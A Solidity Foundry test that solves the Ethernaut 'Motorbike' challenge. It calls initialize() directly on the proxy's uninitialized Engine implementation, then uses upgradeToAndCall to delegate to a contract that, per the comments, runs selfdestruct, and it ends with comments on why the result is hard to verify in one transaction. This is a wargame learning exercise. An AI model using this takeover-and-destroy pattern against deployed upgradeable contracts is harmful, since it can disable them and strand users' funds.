pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Motorbike/Motorbike.sol";
import "./utils/vm.sol";

contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine ethernautEngine = Engine(payable(address(motorbike)));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // initialise the engine
        engine.initialize();

        // Set up bike Exy 
        BikeExy bikeExy = new BikeExy();

        // Get data required for the upgrade to and call method
        bytes memory initEncoded = abi.encodeWithSignature("initialize()");


        // upgrade to and call will delegate call to bikeExy which will run selfdestruct
        engine.upgradeToAndCall(address(bikeExy), initEncoded);
        

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Because of the way foundry test work it is very hard to verify this test was successful
        // Selfdestruct is a substate (see pg 8 https://ethereum.github.io/yellowpaper/paper.pdf)
        // This means it gets executed at the end of a transaction, a single test is a single transaction
        // This means we can call selfdestruct on the engine contract at the start of the test but we will
        // continue to be allowed to call all other contract function for the duration of that transaction (test)
        // since the selfdestruct execution only happy at the end 
    }
}